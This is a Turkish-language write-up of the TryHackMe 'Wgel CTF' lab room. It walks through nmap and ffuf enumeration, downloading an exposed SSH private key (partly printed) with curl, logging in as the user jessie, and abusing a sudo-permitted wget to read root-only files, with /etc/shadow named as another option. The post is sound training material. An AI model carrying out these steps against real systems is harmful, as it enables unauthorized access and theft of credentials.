---
title: 'TryHackMe | Wgel CTF WriteUp'
author: appdone
categories: [TryHackMe Challenges]
tags: [sudo]
render_with_liquid: false
---

Bu yazımda, TryHackMe platformunda yer alan “Wgel CTF” isimli meydan okumayı çözeceğiz. Öncelikle hedefi tanımak adına nmap ile bir port taraması yapalım. Daha sonra açık portlara ve üzerinde çalışan servislere göre yolumuzu çizmeye başlayabiliriz.

```console
$ nmap -sC -sV -T4 10.10.78.35
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Tarama sonucunda 22 (SSH) ve 80 (HTTP) numaralı portların açık olduğunu ve ana sayfada varsayılan apache2 sayfası olduğunu öğreniyoruz. Sayfanın kaynak kodunu görüntülediğimizde ise bir açıklama satırı ile karşılaşıyoruz.

```
<!-- Jessie don't forget to udate the webiste -->
```

Burada jessie’nin web sitesini güncellemesi gerektiği yazıyor. Web sitesinde bir sorun olduğu bariz ama ne olduğunu veya nerede bilmiyoruz. ffuf aracını kullanarak sitedeki dosya ve dizinleri bulmaya çalıştım. Tarama sonucunda sitede sadece sitemap isimli dizinin bulunduğunu öğrendim.

Web sitesi hazır bir tema kullanıyor. Sayfaların kaynak kodlarına eklenmiş bir açıklama satırı olabilir. Bu yüzden hepsini teker teker kontrol ettim ama hiçbir bilgi bulamadım. Daha fazla dosya bulmak için ffuf aracını kullanarak /sitemap/ dizininin altındaki dosya ve dizinleri görüntülemeye çalışalım.

```console
$ ffuf -u http://10.10.78.35/sitemap/FUZZ -w /usr/share/wordlists/dirb/common.txt
...
.ssh                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 75ms]
css                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 79ms]
fonts                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 68ms]
images                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 65ms]
index.html              [Status: 200, Size: 21080, Words: 1305, Lines: 517, Duration: 71ms]
js                      [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 65ms]
...
```

Tarama sonucunda sitemap dizini altında .ssh adında bir dizinin daha olduğunu öğrendik. Bu dizinin içinde id_rsa dosyası bulunuyor.

```console
$ curl http://10.10.78.35/sitemap/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
...
```

Kullanıcı adının jessie olduğunu biliyoruz. Bu dosyayı kullanarak SSH servisine bağlanabiliriz.

```console
$ curl http://10.10.78.35/sitemap/.ssh/id_rsa > id_rsa
$ chmod 600 id_rsa
$ ssh jessie@10.10.78.35 -i id_rsa

jessie@CorpOne:~$ cd Documents/
jessie@CorpOne:~/Documents$ ls
user_flag.txt
jessie@CorpOne:~/Document
```

Sisteme girdikten sonra ilk bayrağı /home/jessie/Documents dizininde buluyoruz. Daha sonra “sudo -l” komutunu kullandığımızda ise wget aracını root haklarıyla çalıştırabileceğimizi görüyoruz. GTFOBins sitesinde wget aracını arattım ve “wget -i file” komutunu kullanarak dosya okuyabileceğimi öğrendim.

```
LFILE=file_to_read
wget -i $LFILE
```

/etc/shadow dosyasını çekip içerisindeki hash’i kırarak yetki yükseltebiliriz ama ben uğraşmak istemediğimden doğrudan /root/root_flag.txt dosyasını çekeceğim.

```console
jessie@CorpOne:~/Documents$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
jessie@CorpOne:~/Documents$ sudo /usr/bin/wget -i /root/root_flag.txt
--2025-03-18 00:32:20--  http://***/
Resolving *** (***)... failed: Name or service not known.
wget: unable to resolve host address ‘***’
```

Kullanıcı bayrağının bulunduğu dosya user_flag.txt adına sahipti bu yüzden root bayrağının root_flag.txt adında bir dosyada olabileceğini düşündüm. Vakit ayırıp okuduğunuz için teşekkür ederim.
